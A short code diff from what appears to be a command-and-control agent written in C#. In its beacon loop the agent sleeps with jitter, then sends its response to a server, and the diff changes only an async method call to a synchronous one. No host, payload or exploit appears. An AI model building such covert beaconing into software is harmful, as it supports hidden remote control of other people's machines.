@@ -114,7 +114,7 @@ namespace Agent.Profiles
                 await Task.Delay(Misc.GetSleep(this.agentConfig.sleep, this.agentConfig.jitter) * 1000);
                 try
                 {
-                    string responseString = await this.Send(messageManager.GetAgentResponseStringAsync());
+                    string responseString = await this.Send(messageManager.GetAgentResponseString());
 
                     if (String.IsNullOrEmpty(responseString))
                     {
